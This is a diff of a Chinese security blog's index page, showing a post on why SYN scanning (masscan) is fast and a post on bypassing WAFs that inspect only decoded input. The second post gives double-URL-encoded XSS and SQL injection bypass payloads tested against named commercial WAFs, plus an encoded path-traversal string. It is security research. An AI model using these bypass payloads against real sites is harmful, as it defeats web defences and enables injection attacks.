@@ -329,6 +329,124 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E4%B8%BA%E4%BB%80%E4%B9%88masscan%E5%BF%AB%EF%BC%88%E4%B8%80%EF%BC%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-%E4%B8%BA%E4%BB%80%E4%B9%88masscan%E5%BF%AB%EF%BC%88%E4%B8%80%EF%BC%89/" class="post-title-link" itemprop="url">为什么masscan扫描快（一）</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>某天想到一个常见的安全面试问题：”为什么masscan扫描快？”</p>
+<p>以往我认为是下面三点原因：</p>
+<ul>
+<li>使用syn扫描</li>
+<li>扫描地址随机化</li>
+<li>发包和接受包使用了性能更好的pf_ring包处理框架</li>
+</ul>
+<p>随着最近补了一些网络的基础知识，感觉有点不对劲：</p>
+<ul>
+<li>nmap也支持syn扫描、扫描地址随机化，所以masscan真的是因为这两点比nmap快么？</li>
+<li>nmap用的是啥发包，它为什么不用pf_ring呢？</li>
+<li>pf_ring真的快么？</li>
+</ul>
+<p>这一篇文章主要记录我对syn扫描的学习和做扫描器时遇到的案例。</p>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><h2 id="什么是syn扫描？"><a href="#什么是syn扫描？" class="headerlink" title="什么是syn扫描？"></a>什么是syn扫描？</h2><p>  也叫半连接扫描，基于sendto系统调用。</p>
+<p>  在syn扫描出现之前，端口扫描大多数基于connect系统调用，因此会完成tcp三次握手。</p>
+<h2 id="为什么要用syn扫描？"><a href="#为什么要用syn扫描？" class="headerlink" title="为什么要用syn扫描？"></a>为什么要用syn扫描？</h2><p>  一般都会说syn有三个好处：<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 更隐蔽（相比于connect扫描）</span><br><span class="line">* 更快（相比于connect扫描）</span><br><span class="line">* 比ACK&#x2F;Window&#x2F;Maimon scans等扫描方式（namp的-sA&#x2F;sW&#x2F;sM参数）兼容性好</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li><p>真的更隐蔽么？</p>
+<p>说syn扫描隐蔽的原因是”被扫描主机”和”IDS/IPS”设备 因为没有看到完整的”三次握手”，所以不会记录日志。</p>
+<p>然而现在的防护设备似乎都认识syn扫描，所以已经没有”更隐蔽”这个优势了。</p>
+</li>
+<li><p>为什么比connect扫描快？</p>
+<p>我以前的误区是connect扫描握手需要三个包，而syn扫描是只需要两个包，少发了一个包所以更快。</p>
+<p>实际上更快的原因是：</p>
+<p>当客户端发出去的syn包后收不到响应时（”网络质量不好”或者”扫描目标ip不存在”时会发生）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* connect扫描因为用的是connect系统调用，所以会重传syn包。在linux默认配置时，最多会等待32s才会返回</span><br><span class="line"></span><br><span class="line">* syn扫描因为使用sendto系统调用，它把syn包发出去后就可以立马返回，不会等syn-ack包</span><br></pre></td></tr></table></figure>
+
+<p>一个需要阻塞等待，另一个发送完就返回了，那肯定是发完就返回的快啊。</p>
+<p>看到这里，不知道你会不会质疑我：发完就返回，不等syn-ack包，那syn扫描怎么判断端口是开放的。</p>
+</li>
+</ul>
+<h2 id="syn扫描是怎么判断端口是开放的？"><a href="#syn扫描是怎么判断端口是开放的？" class="headerlink" title="syn扫描是怎么判断端口是开放的？"></a>syn扫描是怎么判断端口是开放的？</h2><p>  虽然sendto系统调用”不等待syn-ack包”，但是当syn-ack包来的时候我们再接着处理就好了。</p>
+<p>  比如当系统接收到一个syn-ack包，我们看一下包是不是从我们扫描对象发过来的，如果是我们就可以从syn-ack包中取出端口信息，认为目标端口是开放的。当然为了防止一些误报，我们还可以做一些检查。</p>
+<p>  所以在syn扫描实现时，我们可以采用两个线程（masscan也是这么实现的）：</p>
+<ul>
+<li>一个线程专门来发syn包</li>
+<li>另一个线程专门来接收syn-ack包，从syn-ack包中判断端口是否开放</li>
+</ul>
+<h2 id="show-me-the-demo"><a href="#show-me-the-demo" class="headerlink" title="show me the demo"></a>show me the demo</h2><p>  网上找的一个demo <a target="_blank" rel="noopener" href="https://blog.csdn.net/u011721501/article/details/38642133">简单实现SYN端口扫描</a></p>
+<p>  发送请求：<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sockfd &#x3D; socket(AF_INET,SOCK_RAW,IPPROTO_TCP)  # 使用SOCK_RAW创建原始套接字</span><br><span class="line">..</span><br><span class="line">int ret &#x3D; sendto(sockfd,buffer,sizeof(tcpHeader),0,(struct sockaddr*)&amp;target,sizeof(target)) ;  # 发送syn包后立马返回</span><br></pre></td></tr></table></figure></p>
+<p>  接收请求：<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">size &#x3D; recvfrom(sockfd,msg,sizeof(msg),0,(struct sockaddr*)&amp;myaddr,&amp;len) ;  &#x2F;&#x2F; 阻塞接收ack包</span><br></pre></td></tr></table></figure></p>
+<h2 id="之前做扫描器实践中遇到的案例"><a href="#之前做扫描器实践中遇到的案例" class="headerlink" title="之前做扫描器实践中遇到的案例"></a>之前做扫描器实践中遇到的案例</h2><p>  端口扫描结果中发现有的ip开放了5000+个端口，并且端口上似乎没有什么业务。</p>
+<p>  估摸着我可能遇到了 <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/2a03fb550cf5">DDOS之syn flood 原理及防护</a> 中提到的syn代理。</p>
+<p>  防火墙只要遇到syn包都回syn-ack,这样syn扫描时就会认为端口是开放的。</p>
+<p>  PS：下次再碰到这样的目标详细看看。如果读者有现成的目标案例，欢迎公众号私信给我。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
+<li>syn扫描比connect扫描快是因为connect扫描不太受用户程序控制，有可能等待很久。</li>
+<li>syn扫描实现会有两个线程，一个线程负责发syn包，另一个线程负责接收syn-ack包、判断端口开放、回rst包</li>
+</ul>
+<p>另外nmap的文档关于syn扫描和connect扫描都写得很好，值得阅读。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://nmap.org/book/synscan.html#scan-methods-fig-syn-scan-open">nmap官方文档-syn扫描</a></li>
+<li><a target="_blank" rel="noopener" href="https://nmap.org/book/scan-methods-connect-scan.html">nmap官方文档-connect扫描</a></li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E4%BB%8Eshiro-550%E6%BC%8F%E6%B4%9E%E5%93%81%E9%98%BF%E9%87%8C%E4%BA%91waf%E8%A7%84%E5%88%99%E5%BC%95%E6%93%8E/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -559,7 +677,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E4%B8%BA%E4%BB%80%E4%B9%88masscan%E5%BF%AB%EF%BC%88%E4%B8%80%EF%BC%89/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E4%BD%A0%E7%9A%84%E6%89%AB%E6%8F%8F%E5%99%A8%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99%E4%B9%88%EF%BC%88%E4%BA%8C%EF%BC%89/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -572,7 +690,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E4%B8%BA%E4%BB%80%E4%B9%88masscan%E5%BF%AB%EF%BC%88%E4%B8%80%EF%BC%89/" class="post-title-link" itemprop="url">为什么masscan扫描快（一）</a>
+          <a href="/2021-12-26-%E4%BD%A0%E7%9A%84%E6%89%AB%E6%8F%8F%E5%99%A8%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99%E4%B9%88%EF%BC%88%E4%BA%8C%EF%BC%89/" class="post-title-link" itemprop="url">你的扫描器可以绕过防火墙么（二）</a>
         </h2>
 
         <div class="post-meta-container">
@@ -596,61 +714,58 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>某天想到一个常见的安全面试问题：”为什么masscan扫描快？”</p>
-<p>以往我认为是下面三点原因：</p>
+          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>看了<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/P5h9_K4YcvsrU4tsdHsJdQ">你的扫描器可以绕过防火墙么？（一）</a>的可能会觉得文章中用base64绕过场景有限。这篇文章介绍一种绕过场景更多一点的方法。</p>
+<p>用过商业waf产品的应该都知道，waf一般都会支持多种解码类型，比如base64、url、unicode等。</p>
+<p>所以<code>Li4vLi4vLi4vZXRjL3Bhc3N3ZA==</code>(“../../../etc/passwd”的base64编码)这种payload，会被waf解码后拦截。</p>
+<p>这里存在一个设计问题：如果waf只检测解码后的数据，不检测原始数据，就会存在一种通用绕过，很多web防护都有可能失效。</p>
+<p>我研究了下面的问题：</p>
 <ul>
-<li>使用syn扫描</li>
-<li>扫描地址随机化</li>
-<li>发包和接受包使用了性能更好的pf_ring包处理框架</li>
+<li>怎么验证waf是否”只检测解码后的数据，不检测原始数据”？</li>
+<li>哪些waf存在这种绕过风险？</li>
+<li>怎么利用？</li>
 </ul>
-<p>随着最近补了一些网络的基础知识，感觉有点不对劲：</p>
-<ul>
-<li>nmap也支持syn扫描、扫描地址随机化，所以masscan真的是因为这两点比nmap快么？</li>
-<li>nmap用的是啥发包，它为什么不用pf_ring呢？</li>
-<li>pf_ring真的快么？</li>
-</ul>
-<p>这一篇文章主要记录我对syn扫描的学习和做扫描器时遇到的案例。</p>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><h2 id="什么是syn扫描？"><a href="#什么是syn扫描？" class="headerlink" title="什么是syn扫描？"></a>什么是syn扫描？</h2><p>  也叫半连接扫描，基于sendto系统调用。</p>
-<p>  在syn扫描出现之前，端口扫描大多数基于connect系统调用，因此会完成tcp三次握手。</p>
-<h2 id="为什么要用syn扫描？"><a href="#为什么要用syn扫描？" class="headerlink" title="为什么要用syn扫描？"></a>为什么要用syn扫描？</h2><p>  一般都会说syn有三个好处：<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 更隐蔽（相比于connect扫描）</span><br><span class="line">* 更快（相比于connect扫描）</span><br><span class="line">* 比ACK&#x2F;Window&#x2F;Maimon scans等扫描方式（namp的-sA&#x2F;sW&#x2F;sM参数）兼容性好</span><br></pre></td></tr></table></figure></p>
-<ul>
-<li><p>真的更隐蔽么？</p>
-<p>说syn扫描隐蔽的原因是”被扫描主机”和”IDS/IPS”设备 因为没有看到完整的”三次握手”，所以不会记录日志。</p>
-<p>然而现在的防护设备似乎都认识syn扫描，所以已经没有”更隐蔽”这个优势了。</p>
-</li>
-<li><p>为什么比connect扫描快？</p>
-<p>我以前的误区是connect扫描握手需要三个包，而syn扫描是只需要两个包，少发了一个包所以更快。</p>
-<p>实际上更快的原因是：</p>
-<p>当客户端发出去的syn包后收不到响应时（”网络质量不好”或者”扫描目标ip不存在”时会发生）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* connect扫描因为用的是connect系统调用，所以会重传syn包。在linux默认配置时，最多会等待32s才会返回</span><br><span class="line"></span><br><span class="line">* syn扫描因为使用sendto系统调用，它把syn包发出去后就可以立马返回，不会等syn-ack包</span><br></pre></td></tr></table></figure>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul>
+<li><p>怎么验证？</p>
+<p>构造满足下面条件的数据：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 如果waf没有解码模块，此数据就应该被拦截</span><br><span class="line">* 如果waf有解码模块，解码后，此数据不应该被拦截</span><br></pre></td></tr></table></figure>
 
-<p>一个需要阻塞等待，另一个发送完就返回了，那肯定是发完就返回的快啊。</p>
-<p>看到这里，不知道你会不会质疑我：发完就返回，不等syn-ack包，那syn扫描怎么判断端口是开放的。</p>
+<p>如果这个数据经过waf没有被拦截，就说明 存在风险。</p>
+<p>比如，如果有一个waf面对如下的测试payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script a&#x3D;&quot;&quot;&gt;alert(1) &#x2F;&#x2F; 被waf拦截</span><br><span class="line">&lt;script a&#x3D;&quot;&quot;&gt;&lt;&#x2F;script&gt;&lt;x a&#x3D;&quot;&gt;alert(1) &#x2F;&#x2F; 不被waf拦截</span><br></pre></td></tr></table></figure>
+<p>其中第二个payload是通过”在第一个payload双引号中添加数据”构造出来的</p>
+<p>就可以构造出下面的”最终payload”：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script a&#x3D;&quot;%25%32%32%25%33%65%25%33%63%25%32%66%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%65%25%33%63%25%37%38%25%32%30%25%36%31%25%33%64&quot;&gt;alert(1)</span><br></pre></td></tr></table></figure>
+
+<p>如果”此waf只检测解码后的数据，不检测原始数据”，就不会拦截”最终payload”</p>
+</li>
+<li><p>验证阿里云waf</p>
+<p>以下是阿里云waf实际拦截结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;&lt;svg onload&#x3D;&#39;xxxx&#x3D;&quot;x alert&quot;&#39;&gt;  拦截</span><br><span class="line">a&#x3D;&lt;svg onload&#x3D;&#39;xxxx&#x3D;&quot;x&quot;&gt; alert&quot;&#39;&gt;  不拦截</span><br></pre></td></tr></table></figure>
+
+<p>所以可以构造出下面的payload并验证</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;&lt;svg onload&#x3D;&#39;xxxx&#x3D;&quot;x%25%32%32%25%33%65 alert&quot;&#39;&gt;  没有拦截</span><br></pre></td></tr></table></figure>
+
+<p>所以，阿里云waf确实存在风险，用<code>a=&lt;svg onload=&#39;xxxx=&quot;x%25%32%32%25%33%65&quot;; alert(1);&#39;&gt;</code>payload就可以绕过</p>
+</li>
+<li><p>验证长亭waf</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;alert(&quot;111&quot;)  中危</span><br><span class="line">a&#x3D;alert(&quot;111&quot;&quot;) 正常</span><br></pre></td></tr></table></figure>
+
+<p>所以可以构造出下面的payload并验证</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;alert(&quot;111%25%32%32&quot;)   中危</span><br></pre></td></tr></table></figure>
+
+<p>所以，长亭waf不存在此风险</p>
+</li>
+<li><p>怎么利用？</p>
+<p>如果waf存在此风险，就有可能导致非常多的web防护失效。</p>
+<p>构造payload的过程如同上面”怎么验证”的过程。</p>
+<p>下面再补充一个同样方式绕过阿里云sql注入防护的案例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;union&#x2F;*anything*&#x2F;select &quot;111&quot;  拦截</span><br><span class="line">a&#x3D;union&#x2F;**&#x2F;*&#x2F; select &quot;111&quot;  未拦截，但是此payload不是有效的</span><br><span class="line"></span><br><span class="line">因此可以得到下面 不拦截、且有效的 payload</span><br><span class="line">a&#x3D;union&#x2F;*%25%32%61%25%32%66*&#x2F;select &quot;111&quot;  未拦截，且payload有效</span><br></pre></td></tr></table></figure>
+
 </li>
 </ul>
-<h2 id="syn扫描是怎么判断端口是开放的？"><a href="#syn扫描是怎么判断端口是开放的？" class="headerlink" title="syn扫描是怎么判断端口是开放的？"></a>syn扫描是怎么判断端口是开放的？</h2><p>  虽然sendto系统调用”不等待syn-ack包”，但是当syn-ack包来的时候我们再接着处理就好了。</p>
-<p>  比如当系统接收到一个syn-ack包，我们看一下包是不是从我们扫描对象发过来的，如果是我们就可以从syn-ack包中取出端口信息，认为目标端口是开放的。当然为了防止一些误报，我们还可以做一些检查。</p>
-<p>  所以在syn扫描实现时，我们可以采用两个线程（masscan也是这么实现的）：</p>
-<ul>
-<li>一个线程专门来发syn包</li>
-<li>另一个线程专门来接收syn-ack包，从syn-ack包中判断端口是否开放</li>
-</ul>
-<h2 id="show-me-the-demo"><a href="#show-me-the-demo" class="headerlink" title="show me the demo"></a>show me the demo</h2><p>  网上找的一个demo <a target="_blank" rel="noopener" href="https://blog.csdn.net/u011721501/article/details/38642133">简单实现SYN端口扫描</a></p>
-<p>  发送请求：<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sockfd &#x3D; socket(AF_INET,SOCK_RAW,IPPROTO_TCP)  # 使用SOCK_RAW创建原始套接字</span><br><span class="line">..</span><br><span class="line">int ret &#x3D; sendto(sockfd,buffer,sizeof(tcpHeader),0,(struct sockaddr*)&amp;target,sizeof(target)) ;  # 发送syn包后立马返回</span><br></pre></td></tr></table></figure></p>
-<p>  接收请求：<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">size &#x3D; recvfrom(sockfd,msg,sizeof(msg),0,(struct sockaddr*)&amp;myaddr,&amp;len) ;  &#x2F;&#x2F; 阻塞接收ack包</span><br></pre></td></tr></table></figure></p>
-<h2 id="之前做扫描器实践中遇到的案例"><a href="#之前做扫描器实践中遇到的案例" class="headerlink" title="之前做扫描器实践中遇到的案例"></a>之前做扫描器实践中遇到的案例</h2><p>  端口扫描结果中发现有的ip开放了5000+个端口，并且端口上似乎没有什么业务。</p>
-<p>  估摸着我可能遇到了 <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/2a03fb550cf5">DDOS之syn flood 原理及防护</a> 中提到的syn代理。</p>
-<p>  防火墙只要遇到syn包都回syn-ack,这样syn扫描时就会认为端口是开放的。</p>
-<p>  PS：下次再碰到这样的目标详细看看。如果读者有现成的目标案例，欢迎公众号私信给我。</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
-<li>syn扫描比connect扫描快是因为connect扫描不太受用户程序控制，有可能等待很久。</li>
-<li>syn扫描实现会有两个线程，一个线程负责发syn包，另一个线程负责接收syn-ack包、判断端口开放、回rst包</li>
-</ul>
-<p>另外nmap的文档关于syn扫描和connect扫描都写得很好，值得阅读。</p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
-<li><a target="_blank" rel="noopener" href="https://nmap.org/book/synscan.html#scan-methods-fig-syn-scan-open">nmap官方文档-syn扫描</a></li>
-<li><a target="_blank" rel="noopener" href="https://nmap.org/book/scan-methods-connect-scan.html">nmap官方文档-connect扫描</a></li>
-</ul>
+<h1 id="最后给自己的公众号打下广告"><a href="#最后给自己的公众号打下广告" class="headerlink" title="最后给自己的公众号打下广告"></a>最后给自己的公众号打下广告</h1><p>我在内部安全保障、安全产品两个方向有一些工作经验；在启明、百度等大厂也都呆过，也曾在房多多和安全团队一起做过从0到1的安全建设；在漏洞挖掘这一块虽然不是经验丰富，但之前也给”华为、阿里、360、百度、字节”等国内的大厂提交过一些高危严重漏洞（PS：并不代表我觉得这些src都非常好）；</p>
+<p>我后面会持续写 “安全产品”、”后端开发”、”有意思的安全问题/漏洞”，如果读者有什么想一起讨论的”题材”，欢迎在公众号后台留言；</p>
+<p>目前公众号一篇文章阅读量只有50-70，感觉太惨淡了。如果读者觉得我的文章有帮助，就希望能在公众号”点赞、在看、分享”，”点赞”和”在看”似乎也能增加一些曝光量。要不然文章就只能关注的人才能看得到。</p>
 
       
     </div>
@@ -823,121 +938,6 @@
 </ul>
 <h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>所以，现在你清楚怎么绕过shiro漏洞的防护了么？</p>
 <p>另外，如果读者有第二种情况绕过的案例，欢迎公众号后台私信我。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E4%BD%A0%E7%9A%84%E6%89%AB%E6%8F%8F%E5%99%A8%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99%E4%B9%88%EF%BC%88%E4%BA%8C%EF%BC%89/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E4%BD%A0%E7%9A%84%E6%89%AB%E6%8F%8F%E5%99%A8%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99%E4%B9%88%EF%BC%88%E4%BA%8C%EF%BC%89/" class="post-title-link" itemprop="url">你的扫描器可以绕过防火墙么（二）</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>看了<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/P5h9_K4YcvsrU4tsdHsJdQ">你的扫描器可以绕过防火墙么？（一）</a>的可能会觉得文章中用base64绕过场景有限。这篇文章介绍一种绕过场景更多一点的方法。</p>
-<p>用过商业waf产品的应该都知道，waf一般都会支持多种解码类型，比如base64、url、unicode等。</p>
-<p>所以<code>Li4vLi4vLi4vZXRjL3Bhc3N3ZA==</code>(“../../../etc/passwd”的base64编码)这种payload，会被waf解码后拦截。</p>
-<p>这里存在一个设计问题：如果waf只检测解码后的数据，不检测原始数据，就会存在一种通用绕过，很多web防护都有可能失效。</p>
-<p>我研究了下面的问题：</p>
-<ul>
-<li>怎么验证waf是否”只检测解码后的数据，不检测原始数据”？</li>
-<li>哪些waf存在这种绕过风险？</li>
-<li>怎么利用？</li>
-</ul>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul>
-<li><p>怎么验证？</p>
-<p>构造满足下面条件的数据：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 如果waf没有解码模块，此数据就应该被拦截</span><br><span class="line">* 如果waf有解码模块，解码后，此数据不应该被拦截</span><br></pre></td></tr></table></figure>
-
-<p>如果这个数据经过waf没有被拦截，就说明 存在风险。</p>
-<p>比如，如果有一个waf面对如下的测试payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script a&#x3D;&quot;&quot;&gt;alert(1) &#x2F;&#x2F; 被waf拦截</span><br><span class="line">&lt;script a&#x3D;&quot;&quot;&gt;&lt;&#x2F;script&gt;&lt;x a&#x3D;&quot;&gt;alert(1) &#x2F;&#x2F; 不被waf拦截</span><br></pre></td></tr></table></figure>
-<p>其中第二个payload是通过”在第一个payload双引号中添加数据”构造出来的</p>
-<p>就可以构造出下面的”最终payload”：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script a&#x3D;&quot;%25%32%32%25%33%65%25%33%63%25%32%66%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%65%25%33%63%25%37%38%25%32%30%25%36%31%25%33%64&quot;&gt;alert(1)</span><br></pre></td></tr></table></figure>
-
-<p>如果”此waf只检测解码后的数据，不检测原始数据”，就不会拦截”最终payload”</p>
-</li>
-<li><p>验证阿里云waf</p>
-<p>以下是阿里云waf实际拦截结果</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;&lt;svg onload&#x3D;&#39;xxxx&#x3D;&quot;x alert&quot;&#39;&gt;  拦截</span><br><span class="line">a&#x3D;&lt;svg onload&#x3D;&#39;xxxx&#x3D;&quot;x&quot;&gt; alert&quot;&#39;&gt;  不拦截</span><br></pre></td></tr></table></figure>
-
-<p>所以可以构造出下面的payload并验证</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;&lt;svg onload&#x3D;&#39;xxxx&#x3D;&quot;x%25%32%32%25%33%65 alert&quot;&#39;&gt;  没有拦截</span><br></pre></td></tr></table></figure>
-
-<p>所以，阿里云waf确实存在风险，用<code>a=&lt;svg onload=&#39;xxxx=&quot;x%25%32%32%25%33%65&quot;; alert(1);&#39;&gt;</code>payload就可以绕过</p>
-</li>
-<li><p>验证长亭waf</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;alert(&quot;111&quot;)  中危</span><br><span class="line">a&#x3D;alert(&quot;111&quot;&quot;) 正常</span><br></pre></td></tr></table></figure>
-
-<p>所以可以构造出下面的payload并验证</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;alert(&quot;111%25%32%32&quot;)   中危</span><br></pre></td></tr></table></figure>
-
-<p>所以，长亭waf不存在此风险</p>
-</li>
-<li><p>怎么利用？</p>
-<p>如果waf存在此风险，就有可能导致非常多的web防护失效。</p>
-<p>构造payload的过程如同上面”怎么验证”的过程。</p>
-<p>下面再补充一个同样方式绕过阿里云sql注入防护的案例：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;union&#x2F;*anything*&#x2F;select &quot;111&quot;  拦截</span><br><span class="line">a&#x3D;union&#x2F;**&#x2F;*&#x2F; select &quot;111&quot;  未拦截，但是此payload不是有效的</span><br><span class="line"></span><br><span class="line">因此可以得到下面 不拦截、且有效的 payload</span><br><span class="line">a&#x3D;union&#x2F;*%25%32%61%25%32%66*&#x2F;select &quot;111&quot;  未拦截，且payload有效</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
